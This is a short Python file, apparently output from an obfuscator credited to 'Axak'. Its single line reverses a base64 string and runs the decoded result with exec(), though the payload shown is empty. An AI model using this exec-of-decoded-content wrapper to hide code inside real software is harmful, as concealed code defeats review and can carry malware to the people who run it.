# Obfuscated By Axak 
# https://www.github.com/PaNdAxAk 
# Time : Thu Jul 14 22:34:29 2022 

_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'='))